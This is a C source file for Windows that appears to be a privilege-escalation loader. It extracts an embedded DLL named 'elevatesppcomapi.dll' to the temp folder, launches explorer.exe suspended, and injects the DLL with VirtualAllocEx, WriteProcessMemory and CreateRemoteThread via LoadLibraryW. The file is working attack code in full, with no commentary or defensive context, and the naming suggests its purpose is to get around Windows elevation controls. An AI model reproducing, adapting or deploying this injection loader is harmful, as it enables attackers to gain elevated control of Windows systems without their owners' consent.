#include        <windows.h>
#include        <stdio.h>
#include        "resource.h"

int __cdecl wmain(int argc, wchar_t **argv){
        PVOID   lpDllBuffer;
        DWORD   dwDllSize;
        WCHAR   wsElevateDllPath[MAX_PATH];
        DWORD   dwWritten;
        WCHAR   wsExplorerPath[MAX_PATH];
        STARTUPINFO     sinfo;
        PROCESS_INFORMATION     pinfo;
        ULONG_PTR       fnLoadLibrary;
        PVOID           lpRemoteBuffer;
        HANDLE          hFile;
        HANDLE          hThread;
        
        lpDllBuffer = LockResource(LoadResource(GetModuleHandle(0), FindResource(GetModuleHandle(0), MAKEINTRESOURCE(IDR_ELEVATE_DLL), L"BIN")));
        dwDllSize   = SizeofResource(GetModuleHandle(0), FindResource(GetModuleHandle(0), MAKEINTRESOURCE(IDR_ELEVATE_DLL), L"BIN"));   
        
        memset(wsElevateDllPath, 0, sizeof(wsElevateDllPath));
        GetTempPath(MAX_PATH, wsElevateDllPath);
        
        wcsncat(wsElevateDllPath, L"\\elevatesppcomapi.dll", MAX_PATH);
        
        hFile = CreateFile(wsElevateDllPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0,0);
        if (hFile == INVALID_HANDLE_VALUE) return 1;
        WriteFile(hFile, lpDllBuffer, dwDllSize, &dwWritten, 0);
        CloseHandle(hFile);
        
        
        memset(wsExplorerPath, 0, sizeof(wsExplorerPath));
        GetWindowsDirectory(wsExplorerPath, MAX_PATH);
        wcsncat(wsExplorerPath, L"\\explorer.exe", MAX_PATH);
        
        memset(&sinfo, 0, sizeof(sinfo));
        memset(&pinfo, 0, sizeof(pinfo));
        
        CreateProcess(NULL,
                      wsExplorerPath,
                      0,
                      0,
                      0,
                      CREATE_SUSPENDED,
                      0,
                      0,
                      &sinfo, 
                      &pinfo);
 
        fnLoadLibrary = (ULONG_PTR)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
        
        lpRemoteBuffer = VirtualAllocEx(pinfo.hProcess, 0, wcslen(wsElevateDllPath) * sizeof(WCHAR) + sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(pinfo.hProcess, lpRemoteBuffer, wsElevateDllPath, wcslen(wsElevateDllPath) * sizeof(WCHAR) + sizeof(WCHAR), 0);
        
        hThread = CreateRemoteThread(pinfo.hProcess, 0,0, (LPTHREAD_START_ROUTINE)fnLoadLibrary, lpRemoteBuffer, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);               
}